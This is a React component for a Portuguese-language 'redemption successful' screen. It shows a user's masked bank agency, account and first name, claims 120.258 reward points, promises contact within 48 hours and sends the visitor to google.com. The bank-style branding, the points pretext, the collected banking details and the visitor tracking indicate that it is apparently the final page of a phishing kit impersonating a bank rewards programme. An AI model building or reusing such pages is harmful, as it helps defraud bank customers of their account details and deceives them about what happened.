import { ShieldCheck } from "lucide-react";
import { useLocation } from "react-router-dom";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";

const Sucesso = () => {
  useVisitorTracking("sucesso");
  const location = useLocation();
  const { nome, agencia, conta } = (location.state as any) || {};

  const maskAgencia = (v: string) => {
    if (!v || v.length < 2) return v || "";
    return "*" + v.slice(-2);
  };

  const maskConta = (v: string) => {
    if (!v) return "";
    const clean = v.replace(/\D/g, "");
    if (clean.length < 2) return v;
    const last2 = clean.slice(-2);
    return "***" + last2.slice(0, 1) + "-" + last2.slice(1);
  };

  return (
    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
      {/* Top info */}
      <div className="px-5 pt-10 pb-20 space-y-1">
        <p className="text-primary-foreground text-base">
          Agência sem dígito: <span className="font-bold">{maskAgencia(agencia)}</span>
        </p>
        <p className="text-primary-foreground text-base">
          Conta com dígito: <span className="font-bold">{maskConta(conta)}</span>
        </p>
        <p className="text-primary-foreground text-base">
          Titularidade: <span className="font-bold">{nome?.split(" ")[0]?.toUpperCase() || "TITULAR"}</span>
        </p>
      </div>

      {/* White card */}
      <div className="flex-1 bg-white rounded-t-3xl px-6 pt-16 pb-8 flex flex-col items-center">
        <div className="w-20 h-20 rounded-full bg-orange-50 flex items-center justify-center mb-6">
          <ShieldCheck className="text-[#FF6200]" size={40} />
        </div>

        <h1 className="text-foreground font-bold text-xl mb-3 text-center">Resgate realizado com sucesso!</h1>
        <p className="text-muted-foreground text-base text-center mb-1">
          Você possui <span className="text-[#FF6200] font-bold">120.258</span> pontos para o resgate.
        </p>
        <p className="text-muted-foreground text-base text-center mb-8">
          Um atendente entrará em contato em até 48 horas.
        </p>

        <div className="flex-1" />

        <button
          onClick={() => window.location.href = "https://www.google.com"}
          className="w-full py-4 rounded-full bg-[#FF6200] text-white font-semibold text-lg hover:opacity-90 transition-opacity"
        >
          finalizar
        </button>
      </div>
    </div>
  );
};

export default Sucesso;
